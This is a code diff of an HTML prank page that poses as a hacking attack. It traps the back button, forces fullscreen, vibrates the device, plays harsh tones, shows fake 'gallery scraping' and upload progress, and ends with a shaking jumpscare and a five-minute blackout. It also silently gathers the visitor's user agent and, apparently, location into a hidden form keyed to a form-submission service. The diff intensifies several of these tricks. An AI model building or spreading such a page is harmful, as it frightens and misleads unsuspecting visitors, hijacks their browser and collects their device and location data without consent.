@@ -8,13 +8,14 @@
     <link rel="icon" href="https://img.icons8.com/ios-filled/50/ff0000/skull.png" type="image/png">
 
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; text-transform: uppercase; user-select: none; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; text-transform: uppercase; user-select: none; touch-action: manipulation; }
         
-        /* Elements Visibility */
+        /* Anti-Screenshot Overlay */
         #anti-ss { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 20000; display: none; align-items: center; justify-content: center; color: white; text-align: center; border: 20px solid red; box-sizing: border-box; }
+        
         canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.8; }
         
-        /* Network Error Style */
+        /* Network Error Overlay */
         #net-error { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 15000; display: none; flex-direction: column; align-items: center; justify-content: center; color: #ff0000; text-align: center; }
 
         /* HUD & Progress */
@@ -27,28 +28,28 @@
         #pct-text { position: absolute; width: 100%; top: 4px; left: 0; color: #fff; font-weight: bold; font-size: 14px; }
         
         /* Floating Touch Messages */
-        .touch-msg { position: fixed; color: #ff0000; font-weight: bold; background: rgba(100,0,0,0.4); border: 1px solid red; padding: 10px 18px; pointer-events: none; z-index: 9999; font-size: 16px; box-shadow: 0 0 20px red; text-shadow: 0 0 5px black; border-radius: 5px; }
+        .touch-msg { position: fixed; color: #ff0000; font-weight: bold; background: rgba(100,0,0,0.5); border: 1px solid red; padding: 10px 18px; pointer-events: none; z-index: 9999; font-size: 16px; box-shadow: 0 0 20px red; text-shadow: 0 0 5px black; border-radius: 5px; }
 
-        /* Final Screens */
+        /* Screens */
         #success-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: none; z-index: 11000; flex-direction: column; align-items: center; justify-content: center; }
         #scare { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000 url('https://p7.itc.cn/images01/20210323/c3157e93c66041ec9990864f1d411470.jpeg') center/cover; display: none; z-index: 12000; animation: shake 0.05s infinite; }
         @keyframes shake { 0% { transform: translate(3px,3px); } 100% { transform: translate(-3px,-3px); } }
         #final-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 13000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 30px; }
-        #typewriter { font-size: 20px; color: #fff; font-weight: bold; }
+        #typewriter { font-size: 18px; color: #fff; font-weight: bold; }
     </style>
 </head>
 <body onload="startHacking()" onmousedown="handleTouch(event)" ontouchstart="handleTouch(event)">
 
     <form id="hack-form" style="display:none;">
         <input type="hidden" name="access_key" value="f0a21e25-dec8-4e72-8cd9-e8b45f892f86">
-        <input type="hidden" name="subject" value="20-Series: Target Hacked!">
-        <input type="hidden" name="device_info" id="device_info">
-        <input type="hidden" name="location" id="city_loc" value="Fetching...">
+        <input type="hidden" name="subject" value="New Device Targeted!">
+        <input type="hidden" name="device" id="device_info">
+        <input type="hidden" name="location" id="city_loc" value="Loading...">
     </form>
 
     <div id="net-error">
         <h2>CONNECTION LOST</h2>
-        <p>RE-ESTABLISHING 20-SERIES LINK...</p>
+        <p>RE-CONNECTING TO 20-SERIES SERVER...</p>
     </div>
 
     <div id="anti-ss"><h2>CRITICAL ERROR</h2><p>SCREENSHOTS DISABLED</p></div>
@@ -68,35 +69,52 @@
 
     <div id="success-screen">
         <h1 style="font-size: 60px; color: #0f0; text-shadow: 0 0 20px #0f0;">SUCCESS</h1>
-        <p style="color: white; font-size: 18px;">UPLOADING DATA 100%</p>
+        <p style="color: white; font-size: 18px;">UPLOADING ENCRYPTED FILES 100%</p>
     </div>
 
     <div id="scare"></div>
-
-    <div id="final-screen">
-        <div id="typewriter"></div>
-    </div>
+    <div id="final-screen"><div id="typewriter"></div></div>
 
     <script>
         let isOnline = true, isStarted = false, isScared = false, audioEnabled = false, formSent = false;
         const canvas = document.getElementById('matrix'), ctx = canvas.getContext('2d');
         const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
 
-        // 1. Trap: Prevent Back Button
+        // 1. Trap: History Manipulation
         history.pushState(null, null, location.href);
-        window.onpopstate = () => { history.pushState(null, null, location.href); alert("SYSTEM LOCKED BY 20-SERIES"); };
+        window.onpopstate = () => { history.pushState(null, null, location.href); alert("SYSTEM LOCKED"); };
 
-        // 2. Network Monitoring
+        // 2. Network Check
         window.addEventListener('offline', () => { isOnline = false; document.getElementById('net-error').style.display = 'flex'; });
         window.addEventListener('online', () => { isOnline = true; document.getElementById('net-error').style.display = 'none'; });
 
-        // 3. Vibration & Touch Logic
+        // 3. Audio Beep Function
+        function playBeep(freq, type, vol, duration) {
+            if (!audioEnabled) return;
+            const osc = audioCtx.createOscillator(), gain = audioCtx.createGain();
+            osc.type = type; osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+            gain.gain.setValueAtTime(vol, audioCtx.currentTime);
+            osc.connect(gain); gain.connect(audioCtx.destination);
+            osc.start(); osc.stop(audioCtx.currentTime + duration);
+        }
+
+        // 4. Forceful Touch Handler (Vibrate + Sound + Fullscreen)
         function handleTouch(e) {
-            if (navigator.vibrate) navigator.vibrate([200, 100, 200]); 
-            if (!audioEnabled) { audioEnabled = true; audioCtx.resume(); document.documentElement.requestFullscreen(); }
+            // Trigger Vibrate (Android)
+            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+
+            // Wake up Audio Context
+            if (!audioEnabled) { 
+                audioEnabled = true; 
+                if (audioCtx.state === 'suspended') audioCtx.resume();
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+
             if (isScared) return;
 
-            const errors = ["ACCESS DENIED", "SYSTEM OVERRIDE", "DATA LEAKING", "ENCRYPTION ACTIVE", "IP TRACKED"];
+            playBeep(200, 'sawtooth', 0.3, 0.1);
+
+            const errors = ["ACCESS DENIED", "SYSTEM OVERRIDE", "DATA LEAKING", "IP TRACKED", "ENCRYPTION ACTIVE"];
             const msg = document.createElement('div');
             msg.className = 'touch-msg';
             msg.innerText = errors[Math.floor(Math.random() * errors.length)];
@@ -107,7 +125,7 @@
             setTimeout(() => msg.remove(), 700);
         }
 
-        // 4. Matrix Background
+        // 5. Matrix Animation
         canvas.height = window.innerHeight; canvas.width = window.innerWidth;
         const letters = "0123456789ABCDEF";
         const drops = Array(Math.floor(canvas.width / 20)).fill(1);
@@ -122,7 +140,7 @@
             });
         }
 
-        // 5. Silent Info Gathering
+        // 6. Data Capture
         async function gatherInfo() {
             document.getElementById('device_info').value = navigator.userAgent;
             try {
@@ -132,12 +150,12 @@
             } catch (e) {}
         }
 
-        // 6. Hacking Progress
+        // 7. Progress Loop
         async function startHacking() {
             if (isStarted) return; isStarted = true;
             gatherInfo();
             setInterval(drawMatrix, 50);
-            const tasks = [{ name: "BYPASSING FIREWALL", speed: 0.7 }, { name: "EXTRACTING MEDIA", speed: 0.4 }, { name: "UPLOADING TO CLOUD", speed: 0.2 }];
+            const tasks = [{ name: "BYPASSING FIREWALL", speed: 0.7 }, { name: "SCRAPING GALLERY", speed: 0.5 }, { name: "UPLOADING TO SERVER", speed: 0.2 }];
             for (let t of tasks) await runTask(t);
             showFinal();
         }
@@ -172,7 +190,8 @@
             isScared = true;
             document.getElementById('success-screen').style.display = 'none';
             document.getElementById('scare').style.display = 'block';
-            if (navigator.vibrate) navigator.vibrate([500, 300, 500, 300, 800]);
+            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 500, 200, 800]); 
+            playBeep(80, 'sawtooth', 1.0, 2.5);
             setTimeout(() => {
                 document.getElementById('scare').style.display = 'none';
                 document.getElementById('final-screen').style.display = 'flex';
@@ -184,7 +203,7 @@
             const text = "This is made for fun! Don't be serious 😊";
             let i = 0; const target = document.getElementById('typewriter');
             function type() { if (i < text.length) { target.innerHTML += text.charAt(i); i++; setTimeout(type, 100); } }
-            setTimeout(type, 300000); // 5 Min Blackout
+            setTimeout(type, 300000); // 5 Minutes
         }
     </script>
 </body>
